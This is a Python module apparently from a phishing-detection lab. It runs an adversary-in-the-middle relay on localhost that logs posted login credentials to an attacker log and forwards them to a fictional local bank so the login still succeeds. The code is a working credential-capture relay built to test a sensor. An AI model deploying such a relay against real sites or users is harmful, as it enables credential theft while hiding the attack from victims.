"""Stage 11 upgrade: lab AiTM (adversary-in-the-middle) relay - 127.0.0.1:8005.

LAB ONLY. Models the attacker's relay: it CAPTURES the victim's (fake) credentials
and FORWARDS them to our OWN Formosa Demo Bank server (127.0.0.1:8000) to complete a
real-looking login. The relay sits between the victim and the genuine (fictional)
bank - so to a check that only asks "did the creds reach the real bank's origin?" the
login looks legitimate, yet the sensor still sees the send leaving to the RELAY'S
origin and can block it. Everything is 127.0.0.1 and fake (demo_user_01 / Lab-Pass-4821).
"""

import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

HOST, PORT = "127.0.0.1", 8005
BANK = "http://127.0.0.1:8000/login"                       # our own Formosa Demo Bank
LOG_PATH = Path(__file__).resolve().parent.parent / "logs" / "attacker.log"


class RelayHandler(BaseHTTPRequestHandler):
    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        # 1) capture - this is the leak the attacker now holds
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"AiTM relay captured: {body}\n")
        # 2) forward to the real (fictional) bank, so the victim's login still succeeds
        try:
            urllib.request.urlopen(urllib.request.Request(
                BANK, data=body.encode(), method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=2).read()
        except Exception:
            pass
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a) -> None:
        pass


def main() -> None:
    print(f"AiTM relay (lab) on http://{HOST}:{PORT} -> forwards to {BANK}")
    HTTPServer((HOST, PORT), RelayHandler).serve_forever()


if __name__ == "__main__":
    main()
